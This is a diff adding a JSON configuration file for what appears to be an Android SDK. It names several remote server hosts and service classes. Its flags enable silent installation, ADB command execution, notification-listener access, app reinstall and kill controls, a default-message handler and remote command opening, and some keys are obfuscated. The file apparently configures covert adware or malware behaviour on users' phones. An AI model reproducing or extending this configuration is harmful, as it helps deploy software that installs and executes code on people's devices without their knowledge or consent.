@@ -1,0 +1,51 @@
+{
+  "appId": "test0301",
+  "channelId": "test",
+  "us": {
+    "mainHost": "https://bcd.lkjuio.com",
+    "host": "https://bcd.lkjuio.com",
+    "pointHost": "https://bcd.lkjuio.com",
+    "PluginServer":"https://fff.abcdserver.com",
+    "newdataevent":"http://ccc.abcdserver.com:8888"
+  },
+  "cs": {
+  "web":"web"
+  },
+  "ap":{
+    "ParentJobService":"sdk.newpre.lib.main.JobHandleServer",
+    "miniService":"sdk.newpre.lib.main.MiniService",
+    "activeReciver":"sdk.newpre.lib.phone.ActiveReciver"
+  },
+  "cp": {
+    "sdks": "0;1",
+    "adsWaitTime": "30",
+    "IsParent": "true",
+    "PluginControl":"false",
+    "foreignSdk":"true",
+    "showStartWorkPoint":"false",
+    "defaultMessage":"setDefaultMessage",
+    "cancelMessage":"cancelDefaultMessage",
+    "openNLS":"openNotificationService",
+    "exeAdb":"execAdbCmd",
+    "isDeleteApkPath":"false",
+    "reInstallApkWaitTime":"10",
+    "debugMode":"true",
+    "oab": "startAIS",
+    "ins": "iA",
+    "uni": "uia",
+    "sw":"so",
+    "hd":"he",
+    "sdkVersion":"11020",
+    "workNextTime":"24",
+    "controlSwitch":"1",
+    "isDebug":"true",
+    "checkAppStatus":"true",
+    "isKillApp":"false",
+    "checkSim":false,
+    "silentInstall":"true",
+    "ParentJobService":"sdk.newpre.lib.main.JobHandleServer",
+    "miniService":"sdk.newpre.lib.main.MiniService",
+    "activeReciver":"sdk.newpre.lib.phone.ActiveReciver",
+    "openCmd":"true"
+  }
+}
